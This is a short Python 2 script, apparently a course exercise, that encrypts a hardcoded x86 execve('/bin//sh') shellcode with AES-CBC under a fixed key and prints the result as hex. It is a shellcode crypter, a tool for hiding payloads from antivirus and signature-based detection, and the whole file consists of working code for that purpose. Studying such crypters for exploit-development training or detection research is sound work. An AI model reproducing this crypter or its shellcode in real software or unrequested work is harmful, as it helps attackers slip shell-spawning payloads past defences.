# aes_encrypter
# Author: buffered4ever
# 15-03-2019

#!/usr/bin/env python

import base64
import binascii

from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class AESCipher:

    def __init__(self, key):
        self.key = key

    def encrypt(self, raw):
        raw = pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new( self.key, AES.MODE_CBC, iv)
        #return base64.b64encode( iv + cipher.encrypt( raw ) )
        return (iv + cipher.encrypt(raw)).encode('hex')

cipher = AESCipher('slaesecuritytube') #key is "slaesecuritytube"
#encrypt the execve shellcode
encrypted = cipher.encrypt('\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')

print "Encrypted shellcode: " + encrypted
